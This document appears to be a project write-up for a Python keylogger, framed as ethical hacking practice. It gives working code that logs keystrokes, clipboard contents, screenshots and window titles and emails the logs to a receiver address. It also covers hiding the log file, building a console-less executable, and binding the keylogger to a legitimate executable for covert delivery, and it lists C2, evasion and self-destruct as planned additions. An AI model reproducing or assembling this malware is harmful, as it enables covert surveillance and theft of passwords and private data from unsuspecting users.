# PYTHON-BASED KEYLOGGER

## Objective

This project aimed to develop a fully functional keylogger using Python that can capture and store keystrokes while operating stealthily in the background. The project included additional functionalities such as:

* Recording keystrokes in real-time.
* Taking periodic screenshots of the target machine.
* Capturing clipboard content.
* Logging active windows to track user activity.
* Operating in stealth mode with minimal detection.
* Sending collected data via email or storing it locally in a file.
* Optionally embedding the keylogger within a legitimate file for stealth delivery.
* This project provided hands-on experience in ethical hacking, malware development, and system monitoring.

### Skills Learned

* **Python programming** (Scripting, automation, and file handling).
* **Keyboard event monitoring** using the pynput module.
* **Screenshot capturing** with Pillow (PIL).
* **Clipboard access** using pyperclip.
* **Active window logging** with pygetwindow.
* **Stealth operation techniques** (running in the background).
* **Data exfiltration** via email and **server-based** delivery.
* **Building standalone executables** with pyinstaller.

### Tools & Libraries Used

* **Python 3** (Primary programming language).
* **pynput** (Keyboard event tracking).
* **Pillow (PIL)** (For taking screenshots).
* **pyperclip** (Clipboard access).
* **pygetwindow** (Tracking the active window).
* **smtplib** (Email sending).
* **pyinstaller** (Converting the script into an executable).

## Steps

1️⃣ **Setting Up the Keylogger**
* Imported pynput.keyboard.Listener to listen for keystrokes.
* Created a function to store the captured keystrokes in a log file.
* Ensured that special keys (Enter, Shift, etc.) were properly recorded.

📌 **Code Snippet: Keystroke Logging:**
```python
from pynput.keyboard import Listener

def log_keystroke(key):
    with open("logs.txt", "a") as file:
        file.write(str(key) + "\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()
```

2️⃣ **Capturing Screenshots**
* Used the Pillow (PIL) library to capture and save screenshots at regular intervals.
* Saved screenshots to a predefined directory.

📌 **Code Snippet: Screenshot Capture**
```python
from PIL import ImageGrab
import time

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}.png")

take_screenshot()
```

3️⃣ **Capturing Clipboard Content**
* Used pyperclip to extract the contents of the clipboard.
* Logged clipboard data alongside keystroke logs.

📌 **Code Snippet: Clipboard Logging**
```python
import pyperclip

def get_clipboard():
    clipboard_data = pyperclip.paste()
    with open("logs.txt", "a") as file:
        file.write("\nClipboard Data: " + clipboard_data + "\n")

get_clipboard()
```

4️⃣ **Logging Active Window Titles**
* Used pygetwindow to track and log the active window.
* This helped in identifying which applications were being used while typing.

📌 **Code Snippet: Active Window Tracking**
```python
import pygetwindow as gw

def get_active_window():
    active_window = gw.getActiveWindow()
    if active_window:
        with open("logs.txt", "a") as file:
            file.write("\nActive Window: " + active_window.title + "\n")

get_active_window()
```

5️⃣ **Sending Data via Email**
* Used Python’s built-in smtplib to send collected logs and screenshots via email.
* Configured email settings to automate data exfiltration.

📌 **Code Snippet: Sending Logs via Email**
```python
import smtplib
from email.message import EmailMessage

def send_logs():
    email_sender = "abc123@example.com"
    email_receiver = "def456@example.com"
    password = "your_password"

    msg = EmailMessage()
    msg.set_content("Attached are the captured logs.")
    msg["Subject"] = "Keylogger Logs"
    msg["From"] = email_sender
    msg["To"] = email_receiver

    with open("logs.txt", "rb") as file:
        msg.add_attachment(file.read(), filename="logs.txt")

    server = smtplib.SMTP_SSL("smtp.example.com", 465)
    server.login(email_sender, password)
    server.send_message(msg)
    server.quit()

send_logs()
```

6️⃣ **Hiding the Keylogger (Stealth Mode)**
* Ensured the script ran in the background without a visible console window.
* Used pyinstaller to bundle the script into an executable file.

📌 **Code Snippet: Running in Background**
```python
import os

def hide_console():
    os.system("attrib +h logs.txt")

hide_console()
```

7️⃣ **Converting to an Executable**
* Used pyinstaller to package the script as an .exe file.
* Ensured it could be delivered as a standalone executable.

📌 **Command to Convert Script:**
```python
pyinstaller --onefile --noconsole keylogger.py
```

8️⃣ **Embedding in a Legitimate File**
* Explored methods of embedding the keylogger into a legitimate file.
* Used payload binding techniques to bundle the script with another executable.

📌 **Command to Bundle with Another File:**
```python
copy /b legitimate.exe + keylogger.exe output.exe
```

**Conclusion**

This project provided valuable experience in ethical hacking, malware development, and stealth operations. The keylogger was designed to be highly functional, capturing keystrokes, screenshots, clipboard data, and active windows while remaining hidden.

**Future Enhancements**
* Encrypting logs before exfiltration to enhance stealth.
* Using a C2 (Command & Control) server for remote access instead of email.
* Improving obfuscation techniques to evade detection.
* Adding self-destruct functionality to erase logs after exfiltration.

**This project demonstrates how keyloggers work and provides insights into security vulnerabilities that can be exploited. Ethical hackers and security professionals can use this knowledge to enhance system defenses against malicious threats.**
